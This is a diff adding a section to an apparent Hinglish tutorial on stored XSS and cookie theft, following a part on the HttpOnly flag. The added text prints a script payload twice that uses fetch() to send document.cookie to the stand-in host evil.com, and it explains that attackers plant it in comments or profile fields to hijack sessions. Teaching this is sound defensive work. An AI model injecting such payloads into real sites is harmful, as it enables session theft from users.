@@ -147,4 +147,42 @@ Example: **Set-Cookie: sessionid=abc123; HttpOnly;**
 
 Toh XSS hone ke bawajood document.cookie khali rahega. ✅
 
+---
+
+### Payload:
+
+**<script>fetch("https://evil.com/steal?cookie=" + document.cookie);</script>**
+
+🔥 Yeh attacker kahan inject karega?
+
+Attacker wo jagah dhoondta hai jahaan user input store hota hai aur baad mein show bhi hota hai bina sanitize kiye.
+
+### 🔍 Real Examples:
+
+Comment section of a blog/post: Attacker comment mein XSS script likhta hai.
+
+**<script>fetch("https://evil.com/steal?cookie=" + document.cookie);</script>**
+
+Profile name / bio / message boards: Attacker profile update karta hai is payload se.
+
+Jab koi user us attacker ka profile ya comment dekhta hai, toh script chalti hai aur document.cookie attacker ko send ho jaati hai.
+
+---
+
+### 👨‍💻 Flow:
+
+1. Attacker inject karta hai XSS payload (e.g., in comment).
+
+2. Payload store ho jaata hai server pe (Stored XSS).
+
+3. Jab victim us page ko dekhta hai:
+
+<script> chal jaata hai
+
+document.cookie fetch hota hai
+
+fetch() se cookie chali jaati hai attacker's site pe
+
+4. Attacker session hijack kar leta hai.
+
 
